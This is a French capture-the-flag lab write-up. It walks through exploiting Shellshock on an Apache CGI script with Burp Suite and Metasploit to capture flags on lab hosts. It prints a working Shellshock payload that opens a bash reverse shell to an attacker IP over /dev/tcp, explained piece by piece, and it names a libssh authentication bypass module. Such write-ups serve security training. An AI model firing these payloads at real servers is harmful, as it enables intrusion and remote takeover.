
Outils conseillés :  
* nmap  
* Burp Suite  
* Metasploit Framework  

---

### Flags
**🏴‍☠️ 1) Vérifiez le répertoire racine ('/') pour trouver un fichier qui pourrait contenir la clé du premier drapeau sur target1.ine.local.**  

**🏴‍☠️ 2)Il se peut qu'un élément soit caché dans le répertoire racine du serveur. Explorez attentivement le répertoire « /opt/apache/htdocs/ » pour trouver le prochain paramètre sur target1.ine.local.**  

**🏴‍☠️ 3)Examinez le répertoire personnel de l'utilisateur et envisagez d'utiliser 'libssh_auth_bypass' pour découvrir l'indicateur sur target2.ine.local.**  

**🏴‍☠️ 4)Les zones les plus confidentielles recèlent souvent les secrets les plus précieux. Explorez le répertoire « /root » pour trouver le flag caché sur target2.ine.local.**  

---

### Phase de reconnaissance  

<details>

<summary><h3> :arrow_forward: ** Flag 1) Vérifiez le répertoire racine ('/') pour trouver un fichier qui pourrait contenir la clé du premier drapeau sur target1.ine.local.**  
<h3></summary>  

#### Ping de la cible  
![alt text](<../Images/Capture d'écran 2026-01-11 151226.png>)  

#### Scan avec nmap  
![alt text](<../Images/Capture d'écran 2026-01-11 151653.png>) 

>:bulb: Le port 80 est ouvert et un serveur "Apache 2.4.6" est ouvert.  

#### Connexion au site web

![alt text](<../Images/Capture d'écran 2026-01-11 151952.png>)
>:bulb: On voit qu'il nous redirigie vers un ``script .cgi``
> L'exploit ShellShock cible les .cgi pour obtenir un shell.

🔹**Méthode avec Burp Suite**
* Démarrer burp suite (dans les settings, "Burp's browser", cocher "allow Burp's browser to run without a sandbox")
* Proxy, Open browser (intercept is on)
* Rentrer l'adresse dans l'url, elle doit être bloquée et on voit la requête HTTP. clic droit>send to repeater
* Modifier la ligne comme sur la photo pour récupérer les comptes users.  
![alt text](<../Images/Capture d'écran 2026-01-11 170832.png>)

* On ouvre un port sur la machine attaquante  
  ![alt text](<../Images/Capture d'écran 2026-01-11 171237.png>)

* On envoie () **``() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/192.114.109.2/1234 0>&1'``**  
  - `() { :; };` : Bash croit recevoir une définition de fonction, mais à cause du bug, tout ce qui vient après le ; est exécuté  
  - ``echo; echo;`` : Ça génère juste des lignes vides pour que la réponse CGI reste propre (format HTTP valide).  
  - `/bin/bash -c ' … '` : Lance un shell bash  
  - `bash -i` : -i lance un vrai shell.  
  - `>& /dev/tcp/192.114.109.2/1234` : Bash ouvre une connexion TCP vers cette IP et ce port  
* le reverse shell fonctionne il reste plus qu'à se déplacer et récupérer le flag.  
![alt text](<../Images/Capture d'écran 2026-01-11 172027.png>)
![alt text](<../Images/Capture d'écran 2026-01-11 172222.png>)






🔹**Méthode avec Metasploit**

* Pour ce module ci dessous, nous devons configurer deux paramètres : le premier est RHOSTS, et le second est TARGETURI. Une fois ces paramètres définis, il suffit d'exécuter l'exploit à l'aide de la runcommande .
![alt text](<../Images/Capture d'écran 2026-01-11 174449.png>)
Et on obtient un meterpreter : `shell ` pour obtenir un shell bash, puis on récupère le flag1 et le flag 2...  



</details>



<details>

<summary><h3> :arrow_forward: ** Flag 2) Il se peut qu'un élément soit caché dans le répertoire racine du serveur. Explorez attentivement le répertoire « /opt/apache/htdocs/ » pour trouver le prochain paramètre sur target1.ine.local.**  
<h3></summary>  

Ce flag est facile à trouver une fois le reverse shell en place avec burp et netcat...  
![alt text](<../Images/Capture d'écran 2026-01-11 172542.png>)
